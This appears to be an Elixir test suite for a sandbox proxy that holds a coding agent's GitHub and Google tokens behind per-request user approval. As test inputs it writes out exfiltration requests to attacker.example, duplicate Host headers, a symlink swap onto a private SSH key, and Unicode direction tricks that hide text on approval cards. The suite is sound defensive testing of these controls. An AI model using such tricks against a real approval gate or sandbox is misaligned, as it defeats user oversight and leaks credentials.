defmodule MWTClient.Sandbox.GuaranteesTest do
  @moduledoc """
  What docs/agent_sandbox.md says the sandbox does, one test per sentence.
  Written during the 2026-11-13 review, when all of them failed; each names
  the gap it closed. They go through the proxy as microsandbox reaches it,
  with an upstream that keeps the request it received, which the harness
  adds to the answer the VM got (`https/3`, `with_received/2`): the proxy
  cuts an answer that quotes the real value, so it can't come back there.
  """
  use ExUnit.Case, async: true

  import ExUnit.CaptureLog

  alias MWTClient.Sandbox

  alias MWTClient.Sandbox.{
    Allowance,
    Describe,
    Grant,
    HostCommand,
    HostRun,
    Server,
    Share
  }

  alias MWTClient.Sandbox.CertificateAuthority, as: CA
  alias MWTClient.Sandbox.Egress.Tcp
  alias MWTClient.Storage.Documents
  alias MWTClient.Vault.Store

  @real "ghp_REAL_SECRET_VALUE"

  ## Harness: the proxy as microsandbox reaches it, and an upstream that
  ## keeps the request it received, for the test to read beside the answer.

  defp proxy(username) do
    received = :ets.new(:guarantees_received, [:public, :set])
    upstream = start_upstream(received)
    {:ok, listen} = :gen_tcp.listen(0, [:binary, active: false, ip: {127, 0, 0, 1}])
    {:ok, port} = :inet.port(listen)

    options = [
      upstream: fn _host ->
        :ssl.connect(~c"127.0.0.1", upstream, verify: :verify_none, active: false, mode: :binary)
      end
    ]

    spawn_link(fn -> accept(listen, username, options) end)
    [{:Certificate, ca, _}] = username |> Sandbox.ca_pem() |> :public_key.pem_decode()
    %{proxy: port, ca: ca, received: received}
  end

  defp accept(listen, username, options) do
    {:ok, client} = :gen_tcp.accept(listen)

    pid =
      spawn(fn ->
        receive do
          :go -> Tcp.run(client, username, options)
        end
      end)

    :gen_tcp.controlling_process(client, pid)
    send(pid, :go)
    accept(listen, username, options)
  end

  defp start_upstream(received) do
    leaf = CA.leaf(CA.new(), "upstream.test")

    {:ok, listen} =
      :ssl.listen(0, CA.ssl_options(leaf) ++ [active: false, mode: :binary, reuseaddr: true])

    {:ok, {_, port}} = :ssl.sockname(listen)
    spawn_link(fn -> serve(listen, received) end)
    port
  end

  defp serve(listen, received) do
    {:ok, socket} = :ssl.transport_accept(listen)

    spawn(fn ->
      {:ok, socket} = :ssl.handshake(socket)
      head = read_until(socket, "\r\n\r\n", "")
      # Give the body a moment, then keep everything received.
      rest =
        case :ssl.recv(socket, 0, 200) do
          {:ok, more} -> more
          _ -> ""
        end

      id = System.unique_integer([:positive])
      true = :ets.insert(received, {id, head <> rest})
      body = "RECEIVED-ID: #{id}"

      :ssl.send(
        socket,
        "HTTP/1.1 200 OK\r\ncontent-length: #{byte_size(body)}\r\nconnection: close\r\n\r\n#{body}"
      )

      :ssl.close(socket)
    end)

    serve(listen, received)
  end

  defp read_until(socket, marker, acc) do
    if String.contains?(acc, marker) do
      acc
    else
      case :ssl.recv(socket, 0, 5_000) do
        {:ok, data} -> read_until(socket, marker, acc <> data)
        {:error, _} -> acc
      end
    end
  end

  # An answer on a TLS connection is read as a client reads it, up to its
  # end: MWT may keep the connection for the next request.
  defp read_all(socket, :ssl), do: MWTClient.SandboxProxy.read_answer(socket, :ssl)

  defp read_all(socket, mod, acc \\ "") do
    case mod.recv(socket, 0, 5_000) do
      {:ok, data} -> read_all(socket, mod, acc <> data)
      {:error, _closed} -> acc
    end
  end

  # The answer, and after it what the upstream received for it, if any.
  defp with_received(net, response) do
    case Regex.run(~r/RECEIVED-ID: ([0-9]+)/, response) do
      [_, id] ->
        [{_, received}] = :ets.lookup(net.received, String.to_integer(id))
        response <> "\nRECEIVED:\n" <> received

      nil ->
        response
    end
  end

  defp https(%{proxy: proxy, ca: ca} = net, host, request) do
    {:ok, socket} = :gen_tcp.connect(~c"127.0.0.1", proxy, [:binary, active: false])
    :ok = :gen_tcp.send(socket, "CONNECT 140.82.112.3:443 HTTP/1.1\r\n\r\n")
    {:ok, "HTTP/1.1 200" <> _} = :gen_tcp.recv(socket, 0, 5_000)

    {:ok, tls} =
      :ssl.connect(socket,
        verify: :verify_peer,
        cacerts: [ca],
        server_name_indication: String.to_charlist(host),
        active: false,
        mode: :binary
      )

    :ok = :ssl.send(tls, request)
    with_received(net, read_all(tls, :ssl))
  end

  defp github(username, uses) do
    {:ok, grant} =
      Sandbox.create_grant(username, %{
        "kind" => "token",
        "preset" => "github",
        "name" => "GitHub",
        "purpose" => "The GitHub API",
        "hosts" => "api.github.com, github.com",
        "env" => "GH_TOKEN",
        "prefix" => "ghp_",
        "value" => @real
      })

    {:ok, grant} = Sandbox.turn_on(username, grant.id, :until_off, uses)
    grant
  end

  # What the sandbox saved, read while the identity is locked.
  defp saved(username, key) do
    MWTClient.VaultHelpers.with_storage(username, key, fn ->
      Documents.get(username, "sandbox")
    end)
  end

  # Saved in its place, as an earlier MWT, or a session, could leave it.
  defp save(username, key, saved) do
    MWTClient.VaultHelpers.with_storage(username, key, fn ->
      :ok = Documents.put(username, "sandbox", saved)
    end)
  end

  defp waiting(username, count) do
    Enum.find_value(1..300, fn _ ->
      case Sandbox.snapshot(username).waiting do
        list when length(list) >= count -> list
        _ -> Process.sleep(10) && nil
      end
    end) || Sandbox.snapshot(username).waiting
  end

  setup do
    MWTClient.VaultHelpers.unlocked_identity("review")
  end

  ## 1. Expiry

  describe "expiry (guarantee 5)" do
    test "an allowance past its `until` covers nothing" do
      past = DateTime.add(DateTime.utc_now(), -3600, :second)
      allowance = %Allowance{id: "a", pattern: :all, until: past}
      refute Allowance.covers?(allowance, "GET api.github.com/user")
    end

    test "a grant past its `expires_at` is not on" do
      past = DateTime.add(DateTime.utc_now(), -3600, :second)
      grant = %Grant{id: "g", name: "G", kind: :token, state: :on, expires_at: past}
      refute Grant.on?(grant)
    end

    test "no allowance outlives a restart, not even one with no end", %{
      username: username,
      key: key
    } do
      grant = github(username, :ask)

      # Lock, then give the saved grant an allowance for every use, with no
      # end, on a grant that starts on: what a session could leave behind.
      :ok = Store.close(username)
      {:ok, saved} = saved(username, key)

      grants =
        Enum.map(saved.grants, fn g ->
          %{
            g
            | start: if(g.kind == :token, do: :on, else: :off),
              allowances: [%Allowance{id: "allowance-old", pattern: :all, until: nil}]
          }
        end)

      save(username, key, %{saved | grants: grants})
      :ok = Store.open(username, key)

      net = proxy(username)

      sent =
        Task.async(fn ->
          https(
            net,
            "api.github.com",
            "GET /user HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: token #{grant.placeholder}\r\n\r\n"
          )
        end)

      # Intent: every start begins from the grant's own setting, on and
      # asking here, so this use asks.
      held = waiting(username, 1)
      for approval <- held, do: Sandbox.decide(username, approval.id, :deny)
      response = Task.await(sent, 10_000)

      assert length(held) == 1, "the request went out without asking: #{inspect(response)}"
      refute response =~ @real
    end
  end

  describe "copies of Home across the switch to disks" do
    test "a copy recorded with no file is forgotten when MWT starts; one with a file stays", %{
      username: username,
      key: key
    } do
      copies = Path.join([MWTClient.Accounts.dir(username), "sandbox", "disk-snapshots"])
      File.mkdir_p!(copies)
      File.write!(Path.join(copies, "kept.img"), "")

      :ok = Store.close(username)
      {:ok, saved} = saved(username, key)
      at = ~U[2026-11-13 04:16:41Z]

      snapshots = [
        %MWTClient.Sandbox.Snapshot{id: "20261113T041641-205ba8", tag: "old", taken_at: at},
        %MWTClient.Sandbox.Snapshot{id: "kept", tag: "new", taken_at: at}
      ]

      save(username, key, Map.put(saved, :snapshots, snapshots))
      :ok = Store.open(username, key)

      assert [%{id: "kept"}] = Sandbox.snapshot(username).snapshots
    end
  end

  describe "expiry across a restart" do
    test "a grant whose time ran out while MWT was closed is off when it starts", %{
      username: username,
      key: key
    } do
      grant = github(username, :ask)

      :ok = Store.close(username)
      {:ok, saved} = saved(username, key)
      past = DateTime.add(DateTime.utc_now(), -3600, :second)
      grants = Enum.map(saved.grants, &%{&1 | state: :on, expires_at: past})
      save(username, key, %{saved | grants: grants})
      :ok = Store.open(username, key)

      # The sandbox looks at the clock as its first message.
      _ = :sys.get_state(Store.whereis(Server, username))

      assert [%{id: id, state: :off, expires_at: nil}] =
               Enum.reject(
                 Sandbox.snapshot(username).grants,
                 &MWTClient.Sandbox.Grant.built_in?/1
               )

      assert id == grant.id
    end
  end

  ## 2. One approval, one request

  describe "a decision covers what the card shows" do
    test "a different body does not ride on another request's approval", %{username: username} do
      grant = github(username, :ask)
      net = proxy(username)

      send_issue = fn body ->
        Task.async(fn ->
          https(
            net,
            "api.github.com",
            "POST /repos/o/r/issues HTTP/1.1\r\nHost: api.github.com\r\n" <>
              "Authorization: token #{grant.placeholder}\r\nContent-Type: application/json\r\n" <>
              "Content-Length: #{byte_size(body)}\r\n\r\n" <> body
          )
        end)
      end

      first = send_issue.(~s({"title":"harmless"}))
      [shown] = waiting(username, 1)
      second = send_issue.(~s({"title":"NOT SHOWN ON THE CARD","assignees":["attacker"]}))
      Process.sleep(300)

      cards = Sandbox.snapshot(username).waiting
      :ok = Sandbox.decide(username, shown.id, :allow_once)
      first_response = Task.await(first, 10_000)

      second_response =
        case Task.yield(second, 1_500) do
          {:ok, response} -> response
          nil -> :still_held
        end

      for approval <- Sandbox.snapshot(username).waiting,
          do: Sandbox.decide(username, approval.id, :deny)

      if second_response == :still_held, do: Task.await(second, 10_000)

      assert first_response =~ "harmless"

      assert length(cards) == 2 and second_response == :still_held,
             "cards waiting: #{length(cards)}; the unseen request got: " <>
               inspect(second_response, printable_limit: 400)
    end
  end

  ## 3. Facts the agent cannot write

  describe "facts (\"An approval shows facts MWT worked out, not what the agent says\")" do
    defp graphql(document, operation_name \\ nil) do
      body = Jason.encode!(%{query: document, operationName: operation_name})

      Describe.request(%{
        host: "api.github.com",
        method: "POST",
        path: "/graphql",
        headers: [],
        body: body
      })
    end

    test "a mutation behind a comment is not called a query" do
      described = graphql("# list things\nmutation { deleteRepository(input: {}) { id } }")
      assert described.title =~ "mutation", described.title
    end

    test "a mutation selected by operationName is not called a query" do
      described =
        graphql(
          "query viewer { viewer { login } } mutation viewer2 { deleteRepository(input: {}) { id } }",
          "viewer2"
        )

      assert described.title =~ "mutation", described.title
    end

    test "allow-similar for a query does not cover a mutation" do
      query = graphql("query viewer { viewer { login } }")

      mutation =
        graphql(
          "query a { __typename } mutation viewer { deleteRepository(input: {}) { id } }",
          "viewer"
        )

      refute query.pattern == mutation.pattern, "both: #{query.pattern}"
    end
  end

  ## 4. The request MWT judged is the request the host acts on

  describe "what goes upstream" do
    test "an absolute-form target naming another host is refused", %{username: username} do
      grant = github(username, :all)

      response =
        https(
          proxy(username),
          "api.github.com",
          "GET http://attacker.example/collect HTTP/1.1\r\nHost: api.github.com\r\n" <>
            "Authorization: token #{grant.placeholder}\r\n\r\n"
        )

      refute response =~ "GET http://attacker.example/collect",
             "forwarded as sent, with the real value:\n" <> response
    end

    test "a second Host header naming another host is refused", %{username: username} do
      grant = github(username, :all)

      response =
        https(
          proxy(username),
          "api.github.com",
          "GET /user HTTP/1.1\r\nHost: api.github.com\r\nHost: attacker.example\r\n" <>
            "Authorization: token #{grant.placeholder}\r\n\r\n"
        )

      refute response =~ "host: attacker.example", "forwarded with both:\n" <> response
    end

    test "the real value never comes back in a response body", %{username: username} do
      grant = github(username, :all)

      response =
        https(
          proxy(username),
          "api.github.com",
          "TRACE /user HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: token #{grant.placeholder}\r\n\r\n"
        )

      refute response =~ @real, "the VM read the real value:\n" <> response
    end
  end

  ## 5. Host commands run where the card says

  describe "host commands (guarantee 9)" do
    test "the command runs in the folder the card showed" do
      base = Path.join(System.tmp_dir!(), "mwt-review-#{System.unique_integer([:positive])}")
      share = Path.join(base, "share")
      secret = Path.join(base, "home-ssh")
      File.mkdir_p!(Path.join(share, "project"))
      File.mkdir_p!(secret)
      File.write!(Path.join(secret, "id_ed25519"), "PRIVATE KEY")
      on_exit(fn -> File.rm_rf!(base) end)

      {:ok, share} = MWTClient.Sandbox.Shares.realpath(share)
      {:ok, secret} = MWTClient.Sandbox.Shares.realpath(secret)
      dir = Path.join(share, "project")

      {:ok, checked} =
        HostCommand.check(
          %{script: "ls", dir: dir, reason: "list the project"},
          [%Share{path: share}],
          [],
          home: base,
          user: "tester"
        )

      assert checked.dir == dir
      assert {"In", ^dir} = List.keyfind(checked.facts, "In", 0)

      # What could happen to the folder while the card waits for the user
      # (a VM could, when shares were mounted read-write).
      File.rm_rf!(dir)
      File.ln_s!(secret, dir)

      result =
        HostRun.run(
          %{script: "pwd -P; ls", dir: checked.dir, timeout: 10},
          fn _group -> :ok end
        )

      refute result.output =~ "id_ed25519",
             "approved for #{dir}, ran in #{String.trim(result.output)}"
    end
  end

  ## 6. No real value in logs (guarantee 1)

  describe "logs (guarantee 1)" do
    test "a crash while a value is being stored does not log it", %{username: username} do
      pid = Store.whereis(Server, username)
      ref = Process.monitor(pid)

      log =
        capture_log(fn ->
          # Any bug on this path: here, a name that isn't text.
          catch_exit(
            Server.call(username, {
              :create_grant,
              %{"kind" => "token", "name" => 123, "value" => "s3cret-pasted-token"}
            })
          )

          assert_receive {:DOWN, ^ref, :process, ^pid, _reason}
          Process.sleep(100)
        end)

      refute log =~ "s3cret-pasted-token", String.slice(log, 0, 600)
    end
  end

  ## 7. /mnt/mwt is never half written

  describe "the inbox" do
    test "a token file never disappears while grants change", %{username: username} do
      grant = github(username, :ask)
      file = Path.join([Sandbox.snapshot(username).inbox, "tokens", grant.id])
      assert File.read!(file) == grant.placeholder
      parent = self()

      reader =
        spawn_link(fn ->
          Stream.repeatedly(fn -> File.read(file) end)
          |> Enum.reduce_while(0, fn result, missing ->
            missing = if result == {:ok, grant.placeholder}, do: missing, else: missing + 1

            receive do
              :stop -> {:halt, send(parent, {:missing, missing})}
            after
              0 -> {:cont, missing}
            end
          end)
        end)

      for _ <- 1..100 do
        {:ok, _} = Sandbox.turn_off(username, grant.id)
        {:ok, _} = Sandbox.turn_on(username, grant.id, 60, :ask)
      end

      send(reader, :stop)
      assert_receive {:missing, missing}, 5_000
      assert missing == 0, "#{missing} reads found the token file missing or partial"
    end
  end

  ## 8. Bounded state

  describe "bounded state" do
    test "a name under a wildcard host is served with a certificate clients accept", %{
      username: username
    } do
      {:ok, grant} =
        Sandbox.create_grant(username, %{
          "kind" => "token",
          "name" => "Google",
          "purpose" => "Google APIs",
          "hosts" => "*.googleapis.com",
          "env" => "X_TOKEN",
          "value" => "ya29.real"
        })

      {:ok, grant} = Sandbox.turn_on(username, grant.id, :until_off, :all)
      %{proxy: proxy, ca: ca} = net = proxy(username)

      {:ok, socket} = :gen_tcp.connect(~c"127.0.0.1", proxy, [:binary, active: false])
      :ok = :gen_tcp.send(socket, "CONNECT 142.250.0.1:443 HTTP/1.1\r\n\r\n")
      {:ok, "HTTP/1.1 200" <> _} = :gen_tcp.recv(socket, 0, 5_000)

      # As curl and browsers check a name: wildcards count, one label deep.
      {:ok, tls} =
        :ssl.connect(socket,
          verify: :verify_peer,
          cacerts: [ca],
          server_name_indication: ~c"storage.googleapis.com",
          customize_hostname_check: [
            match_fun: :public_key.pkix_verify_hostname_match_fun(:https)
          ],
          active: false,
          mode: :binary
        )

      :ok =
        :ssl.send(
          tls,
          "GET /b HTTP/1.1\r\nHost: storage.googleapis.com\r\nAuthorization: Bearer #{grant.placeholder}\r\n\r\n"
        )

      assert with_received(net, read_all(tls, :ssl)) =~ "authorization: Bearer ya29.real"
    end

    test "names under a wildcard host don't each cost a certificate", %{username: username} do
      {:ok, _grant} =
        Sandbox.create_grant(username, %{
          "kind" => "token",
          "name" => "Google",
          "purpose" => "Google APIs",
          "hosts" => "*.googleapis.com",
          "env" => "X_TOKEN",
          "value" => "ya29.real"
        })

      for i <- 1..2_000, do: MWTClient.Sandbox.Gate.leaf(username, "h#{i}.googleapis.com")
      kept = MWTClient.Sandbox.Gate.leaves(username)

      assert kept <= 64, "#{kept} certificates kept, never dropped"
    end
  end

  ## 9. MWT writes nothing into storage the VM can write

  describe "what the VM can write is the VM's (\"MWT never writes into storage the VM can write\")" do
    test "the instructions and memo reach the VM through /mnt/mwt, for it to copy itself", %{
      username: username
    } do
      inbox = Sandbox.snapshot(username).inbox

      assert File.read!(Path.join(inbox, "agents-block.md")) ==
               MWTClient.Sandbox.Instructions.block()

      assert File.read!(Path.join(inbox, "handoff-command.md")) ==
               File.read!(
                 Path.join([:code.priv_dir(:mwt_client), "sandbox", "handoff-command.md"])
               )

      assert Bitwise.band(File.stat!(Path.join(inbox, "bin/mwt-boot")).mode, 0o111) != 0

      if memo = MWTClient.Sandbox.Memory.host_memo() do
        assert File.read!(Path.join(inbox, "bin/memo")) == File.read!(memo)
      end
    end

    test "nothing in MWT writes the agents' files or the memo tool on the host side" do
      # The two functions that did, and followed links the VM planted, are gone.
      refute function_exported?(MWTClient.Sandbox.Instructions, :write_home!, 2)
      refute function_exported?(MWTClient.Sandbox.Memory, :prepare!, 1)
    end
  end

  ## 10. Text the VM chooses

  describe "text the VM chooses (\"what an approval shows, shows all it holds\")" do
    # Every binary inside a term, however deep.
    defp texts(term) when is_binary(term), do: [term]
    defp texts(term) when is_list(term), do: Enum.flat_map(term, &texts/1)
    defp texts(term) when is_tuple(term), do: term |> Tuple.to_list() |> texts()
    defp texts(%DateTime{}), do: []
    defp texts(%_{} = struct), do: struct |> Map.from_struct() |> texts()
    defp texts(term) when is_map(term), do: term |> Map.to_list() |> texts()
    defp texts(_other), do: []

    defp assert_shown(term) do
      for text <- texts(term) do
        assert String.valid?(text), "not UTF-8: #{inspect(text)}"
        assert MWTClient.Sandbox.Shown.hidden(text) == [], "hides something: #{inspect(text)}"
        assert {:ok, _} = Jason.encode(text)
      end
    end

    test "a request whose target isn't visible ASCII is refused, and nobody is asked", %{
      username: username
    } do
      grant = github(username, :ask)
      net = proxy(username)

      for target <- ["/repos/\xff", "/repos/caf\xc3\xa9", "/repos/a" <> <<0x202E::utf8>> <> "b"] do
        response =
          https(
            net,
            "api.github.com",
            "GET #{target} HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: token #{grant.placeholder}\r\n\r\n"
          )

        assert response =~ "HTTP/1.1 400", inspect(target)
        assert response =~ "visible ASCII"
        refute response =~ @real
      end

      assert Sandbox.snapshot(username).waiting == []
      assert_shown(Sandbox.events(username))
    end

    test "header values and a body made to mislead reach a card that shows all it holds", %{
      username: username
    } do
      grant = github(username, :ask)
      net = proxy(username)
      rlo = <<0x202E::utf8>>

      body =
        Jason.encode!(%{title: "fix " <> rlo <> "kcah", body: "a" <> <<0x200B::utf8>> <> "b"})

      sent =
        Task.async(fn ->
          https(
            net,
            "api.github.com",
            "POST /repos/a/b/issues HTTP/1.1\r\nHost: api.github.com\r\n" <>
              "User-Agent: curl\xff " <>
              rlo <>
              "gnp\r\n" <>
              "Authorization: token #{grant.placeholder}\r\n" <>
              "Content-Type: application/json\r\nContent-Length: #{byte_size(body)}\r\n\r\n" <>
              body
          )
        end)

      assert [approval] = waiting(username, 1)

      # Everything of the card but the request itself, which is kept as it
      # was sent and read through `RequestView`, and the digest retries are
      # joined by, which is compared and never shown.
      assert_shown(approval |> Map.from_struct() |> Map.drop([:request, :join]))
      assert Enum.any?(texts(approval.claims), &(&1 =~ "\\u{202E}"))

      marks = MWTClient.Sandbox.RequestView.marks(Sandbox.snapshot(username).grants)
      assert_shown(MWTClient.Sandbox.RequestView.headers(approval.request, marks))
      assert_shown(MWTClient.Sandbox.RequestView.body(approval.request))
      assert_shown(MWTClient.Sandbox.RequestView.curl(approval.request, marks))

      :ok = Sandbox.decide(username, approval.id, :deny)
      assert Task.await(sent, 10_000) =~ "mwt_denied_by_user"
      assert_shown(Sandbox.events(username))
    end
  end
end
